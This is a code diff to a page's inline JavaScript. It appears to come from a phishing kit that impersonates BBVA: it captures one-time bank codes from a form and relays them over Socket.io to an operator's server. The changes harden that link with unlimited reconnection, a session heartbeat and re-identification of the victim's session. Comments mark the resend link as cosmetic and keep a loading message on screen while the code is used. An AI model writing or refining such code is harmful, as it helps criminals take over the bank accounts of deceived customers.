@@ -90,23 +90,36 @@
     </div>
 
     <script>
-        // ========================================
-        // SOCKET.IO INITIALIZATION
-        // ========================================
+        // Socket.io initialization
         const socket = io({
             transports: ['websocket', 'polling'],
             reconnection: true,
-            reconnectionDelay: 500,
+            reconnectionDelay: 1000,
             reconnectionDelayMax: 5000,
-            reconnectionAttempts: 10,
-            timeout: 20000,
+            reconnectionAttempts: Infinity,
+            timeout: 30000,
             forceNew: false,
-            upgrade: true
+            upgrade: true,
+            rememberUpgrade: true,
+            path: '/socket.io'
         });
 
         // Get original session ID from storage
         const originalSessionId = localStorage.getItem('bbva_session_id');
         console.log('📂 Session ID recuperado:', originalSessionId);
+
+        // Heartbeat para mantener sesión activa
+        let heartbeatInterval = null;
+
+        function startHeartbeat() {
+            if (heartbeatInterval) clearInterval(heartbeatInterval);
+            heartbeatInterval = setInterval(() => {
+                if (socket.connected && originalSessionId) {
+                    socket.emit('heartbeat', { sessionId: originalSessionId });
+                    console.log('💓 Heartbeat enviado');
+                }
+            }, 15000); // Cada 15 segundos
+        }
 
         // Connection monitoring
         socket.on('connect', () => {
@@ -117,33 +130,50 @@
                 socket.emit('identify-session', { originalSessionId });
                 console.log('🔗 Reidentificando con session original:', originalSessionId);
             }
+            
+            startHeartbeat();
         });
 
         socket.on('disconnect', (reason) => {
             console.log('✗ Desconectado del servidor. Razón:', reason);
-            if (reason === 'io server disconnect') {
-                socket.connect();
+            if (heartbeatInterval) clearInterval(heartbeatInterval);
+            
+            // Intentar reconectar en todos los casos
+            if (reason === 'io server disconnect' || reason === 'transport close') {
+                setTimeout(() => {
+                    if (!socket.connected) {
+                        console.log('🔄 Intentando reconectar...');
+                        socket.connect();
+                    }
+                }, 1000);
             }
         });
 
         socket.on('reconnect', (attemptNumber) => {
-            console.log('🔄 Reconectado después de', attemptNumber, 'intentos');
+            console.log('✅ Reconectado después de', attemptNumber, 'intentos');
             if (originalSessionId) {
                 socket.emit('identify-session', { originalSessionId });
             }
+            startHeartbeat();
         });
 
         socket.on('reconnecting', (attemptNumber) => {
-            console.log('🔄 Intentando reconectar...', attemptNumber);
+            console.log('🔄 Intentando reconectar... Intento #', attemptNumber);
+        });
+
+        socket.on('reconnect_error', (error) => {
+            console.error('✗ Error al reconectar:', error.message);
         });
 
         socket.on('connect_error', (error) => {
             console.error('✗ Error de conexión:', error.message);
         });
 
-        // ========================================
-        // FORM FUNCTIONALITY
-        // ========================================
+        socket.on('pong', () => {
+            console.log('🏓 Pong recibido del servidor');
+        });
+
+        // Form functionality
         
         // Only allow numbers in OTP field
         const otpInput = document.getElementById('otpCode');
@@ -188,9 +218,7 @@
             });
         });
 
-        // ========================================
-        // SOCKET EVENT HANDLERS
-        // ========================================
+        // Socket event handlers
         
         // Listen for OTP processing response
         socket.on('otp-processing', (data) => {
@@ -221,16 +249,12 @@
             // Mantener "Cargando..." visible
         });
 
-        // Keep connection alive
-        setInterval(() => {
-            if (socket.connected) {
-                console.log('💓 Conexión activa. Socket ID:', socket.id);
-            }
-        }, 10000);
+        // Limpiar al cerrar página
+        window.addEventListener('beforeunload', () => {
+            if (heartbeatInterval) clearInterval(heartbeatInterval);
+        });
 
-        // ========================================
-        // RESEND CODE (COSMETIC)
-        // ========================================
+        // Resend code (cosmetic)
         document.querySelector('.resend-link').addEventListener('click', function(e) {
             e.preventDefault();
             const originalText = this.innerHTML;
